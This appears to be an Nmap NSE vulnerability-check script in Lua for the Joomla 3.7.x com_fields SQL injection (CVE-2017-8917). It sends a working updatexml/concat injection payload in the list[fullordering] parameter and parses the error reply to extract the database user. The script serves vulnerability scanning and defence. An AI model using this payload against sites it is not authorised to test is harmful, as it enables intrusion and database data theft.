local http = require "http"
local shortport = require "shortport"
local string = require "string"
local stdnse = require "stdnse"
local vulns = require "vulns"
local table = require "table"

description = [[
An SQL Injection vulnerability affecting Joomla! 3.7.x before 3.7.1 allows for
unauthenticated users to execute arbitrary SQL commands. This vulnerability was
caused by a new component, <code>com_fields</code>, which was introduced in
version 3.7. This component is publicly accessible, which means this can be
exploited by any malicious individual visiting the site.

The script attempts to inject an SQL statement that runs the <code>user()</code>
information function on the target website. A successful injection will return
the current MySQL user name and host name in the extra_info table.

This script is based on a Python script written by brianwrf.

References:
* https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
* https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917
]]

---
-- @usage nmap --script http-vuln-cve2017-8917 -p 80 <target>
-- @usage nmap --script http-vuln-cve2017-8917 --script-args http-vuln-cve2017-8917.uri=joomla/ -p 80<target>
-- @output
-- PORT   STATE SERVICE VERSION
-- 80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
-- | http-vuln-cve2017-8917:
-- |   VULNERABLE:
-- |   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
-- |       State: VULNERABLE
-- |     IDs:  CVE:CVE-2017-8917
-- |     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-- |       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
-- |       to execute aribitrary SQL commands via unspecified vectors.
-- |
-- |     Disclosure date: 2017-05-17
-- |     Extra information:
-- |       User: root@localhost
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
-- |_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
--
-- @xmloutput
-- <table key="CVE-2017-8917">
-- <elem key="title">Joomla! 3.7.0 &apos;com_fields&apos; SQL Injection Vulnerability</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2017-8917</elem>
-- </table>
-- <table key="scores">
-- <elem key="CVSSv3">9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</elem>
-- </table>
-- <table key="description">
-- <elem>An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers&#xa;to execute aribitrary SQL commands via unspecified vectors.&#xa;</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="day">17</elem>
-- <elem key="month">05</elem>
-- <elem key="year">2017</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2017-05-17</elem>
-- <table key="check_results">
-- </table>
-- <table key="extra_info">
-- <elem>User: root@localhost</elem>
-- </table>
-- <table key="refs">
-- <elem>https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</elem>
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917</elem>
-- </table>
-- </table>
-- @args http-vuln-cve2017-8917.uri The webroot of the Joomla installation
--
---

author = "Wong Wai Tuck"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

local REG_EXP_SUCCESS = {"XPATH syntax error: &#039;(.-)&#039;",
  "XPATH syntax error: '(.-)'"}

portrule = shortport.http

action = function(host, port)
  local vuln_table = {
    title = "Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability",
    IDS = {CVE = 'CVE-2017-8917'},
    risk_factor = "High",
    scores = {
      CVSSv3 = "9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
    },
    description = [[
An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
to execute aribitrary SQL commands via unspecified vectors.
]],
    references = {
        'https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html',
    },
    dates = {
      disclosure = {year = '2017', month = '05', day = '17'},
    },
    check_results = {},
    extra_info = {}
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln_table.state = vulns.STATE.NOT_VULN

  local uri = stdnse.get_script_args(SCRIPT_NAME .. '.uri') or '/'
  uri = uri .. 'index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,user()),1)'

  stdnse.debug1("Attacking uri %s", uri)
  local response = http.get(host, port, uri)

  stdnse.debug1("Response %s", response.status)

  if response.status then
    local result, matches
    -- If it contains a matching string, it means SQL injection was successful
    -- Otherwise it isn't vulnerable
    for _,  pattern in ipairs(REG_EXP_SUCCESS) do
      stdnse.debug1(pattern)
      result, matches = http.response_contains(response, pattern)
      if result then
        stdnse.debug1("Vulnerability found!")
        vuln_table.state = vulns.STATE.VULN
        table.insert(vuln_table.extra_info, string.format("User: %s", matches[1]))
        break
      end
    end
  end

  return vuln_report:make_output(vuln_table)

end
